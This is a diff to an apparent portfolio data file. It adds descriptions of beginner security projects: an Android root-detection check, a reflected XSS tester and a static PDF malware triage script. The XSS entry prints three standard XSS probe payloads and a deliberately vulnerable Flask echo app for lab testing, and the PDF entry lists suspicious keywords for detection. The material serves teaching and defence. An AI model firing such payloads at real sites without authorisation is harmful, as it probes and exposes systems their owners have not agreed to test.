+      "Try on a rooted emulator to verify root detection triggers correctly.",
+    ],
+    lessonsLearned: [
+      "ADB gives significant device access — USB debugging should be disabled on all non-development enterprise devices.",
+      "Android netstat output format varies by version — parsing it reliably requires handling multiple output layouts.",
+      "Root detection via 'su -c id' can be bypassed by root-hiding tools like Magisk Hide — production MDM uses deeper kernel-level checks.",
+    ],
+    tags: ["android", "adb", "mobile-security", "root-detection", "open-ports", "mdm"],
+  },
+  {
+    id: "xss-scanner",
+    title: "Reflected XSS Tester",
+    category: "analysis",
+    shortDescription: "Tests a web application's search endpoint for reflected XSS by injecting three common payloads and checking if they appear unescaped in the response.",
+    purpose: "Verify whether a web application's query parameters reflect user input without sanitisation — the most basic form of Cross-Site Scripting vulnerability testing.",
+    why: "Reflected XSS remains one of the most prevalent web vulnerabilities (OWASP Top 10 A03:2021). Understanding payload reflection testing is foundational to both offensive security and code review for defence.",
+    how: "Constructs GET requests with each XSS payload appended to the BASE_URL query string, then checks if the raw payload string appears in the response body. Reflection without HTML encoding is a potential XSS sink.",
+    tech: ["Python", "requests", "HTTP", "XSS payloads"],
+    language: "python",
+    difficulty: "beginner",
+    filename: "vuln_scanner.py",
+    code: "",
+    setupSteps: [
+      "Install dependencies: pip install requests",
+      "Set up a vulnerable test target — DVWA, bWAPP, or a simple Flask echo app.",
+      "Edit BASE_URL in the script to point to your test endpoint.",
+      "Run: python vuln_scanner.py",
+    ],
+    usageExample: `python vuln_scanner.py
+# [!] XSS reflected: <script>alert(1)</script>
+# [!] XSS reflected: <img src=x onerror=alert(2)>
+# [ok] No reflection: <svg/onload=alert(3)>`,
+    replicationSteps: [
+      "Create a minimal Flask echo app: from flask import Flask, request; app=Flask(__name__); @app.route('/search')\ndef s(): return request.args.get('q','')",
+      "Run: flask run --port 5000",
+      "Run the scanner — all three payloads should be flagged as reflected.",
+      "Add output escaping with markupsafe.escape() and re-run to confirm no reflection.",
+    ],
+    lessonsLearned: [
+      "Payload reflection in source does not guarantee execution — the browser's CSP may block it. Always verify in a real browser.",
+      "This scanner checks one endpoint. A real scanner iterates all parameters across all discovered pages.",
+      "Only run against systems you own or have written authorisation for — automated GET requests can constitute unauthorised access.",
+    ],
+    tags: ["xss", "vulnerability-scanning", "reflected-xss", "web-security", "owasp"],
+  },
+  {
+    id: "pdf-analyser",
+    title: "Suspicious PDF Analyser",
+    category: "analysis",
+    shortDescription: "Extracts readable strings, computes MD5/SHA-256 hashes, and scans a PDF file for suspicious keywords like 'javascript', 'action', and 'submit'.",
+    purpose: "Perform lightweight static analysis on a PDF file to surface potential malicious indicators — without opening it. Useful for initial triage of suspicious email attachments.",
+    why: "PDFs are a common malware delivery vector. They can embed JavaScript, auto-submit forms, or exploit reader vulnerabilities. Static byte analysis lets you triage safely before deciding whether to sandbox the file.",
+    how: "Reads the PDF as raw bytes, extracts all printable ASCII strings of 4+ characters via regex, computes MD5 and SHA-256 hashes for threat-intel lookups, then cross-references strings against suspicious keywords associated with PDF-based attacks.",
+    tech: ["Python", "hashlib", "regex", "os", "binary string extraction"],
+    language: "python",
+    difficulty: "beginner",
+    filename: "pdf_analysis.py",
+    code: "",
+    setupSteps: [
+      "Install Python 3.8+ — no third-party packages required.",
+      "Place the PDF to analyse in the same directory as the script (or edit the file_path variable).",
+      "Run: python pdf_analysis.py",
+    ],
+    usageExample: `python pdf_analysis.py
+# Analysis Report for: suspicious.pdf
+# MD5:    d41d8cd98f00b204e9800998ecf8427e
+# SHA-256: e3b0c44298fc1c149afb...
+# Suspicious Indicators Found:
+# /JavaScript  << /Action endobj`,
+    replicationSteps: [
+      "Download a benign PDF as a baseline — the analyser should report no suspicious indicators.",
+      "In a sandboxed VM, download a PDF malware sample from a threat-intel repo (MalShare, ANY.RUN).",
+      "Run the analyser against both and compare the output.",
+      "Search the MD5/SHA-256 hashes on VirusTotal to check for known-bad classifications.",
+    ],
+    lessonsLearned: [
+      "Raw string extraction produces noise — the 4-character minimum filter reduces but does not eliminate false positives.",
+      "Hash lookup on VirusTotal is the most efficient first step — if the hash is known-bad, deeper analysis may be unnecessary.",
+      "Real PDF forensics tools (peepdf, pdfid, pdf-parser) parse the PDF object tree — far more accurate than raw string scanning.",
+    ],
+    tags: ["pdf-forensics", "static-analysis", "malware-triage", "hash-analysis", "dfir"],
+  },
+];
 export const cvVariants = {
-  developer: `Eddy Max Kilonzo — Software / Web
-Stack: React, Next.js, Node, TypeScript, PostgreSQL
-Focus: product engineering, design systems, WebGL experiences.`,
-  cyber: `Eddy Max Kilonzo — Cybersecurity
-Stack: SIEM, detection engineering, Python, cloud hardening
-Focus: blue team, IR, vuln research.`,
-  design: `Eddy Max Kilonzo — Creative technologist
-Stack: Figma, motion, Three.js, prototyping
-Focus: interactive narratives and immersive UI.`,
+  cyber: "",
 };
